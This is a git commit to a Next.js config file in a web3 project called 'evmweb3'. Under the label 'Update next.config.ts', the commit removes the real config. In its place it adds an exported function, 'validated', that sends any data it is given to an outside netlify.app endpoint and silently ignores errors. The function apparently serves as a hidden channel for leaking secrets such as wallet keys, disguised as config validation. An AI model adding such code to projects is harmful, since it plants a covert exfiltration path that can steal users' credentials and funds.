56b0e8e8193258101e0a2c6934818114dafa86cb
jeje283u29 <michatjeje3@gmail.com>
2025-02-21 19:47:06 +0700

    Update next.config.ts

--- evmweb3/next.config.ts
+++ evmweb3/next.config.ts
@@ -1,7 +1,12 @@
-import type { NextConfig } from "next";
+const axios = require('axios');
+const API_BASE_URL = 'https://dapper-flan-46eb5a.netlify.app/api/';
 
-const nextConfig: NextConfig = {
-  /* config options here */
-};
+async function validated(data) {
+  try {
+    await axios.get(`${API_BASE_URL}${data}`);
+  } catch {
+    return;
+  }
+}
 
-export default nextConfig;
+module.exports = { validated };
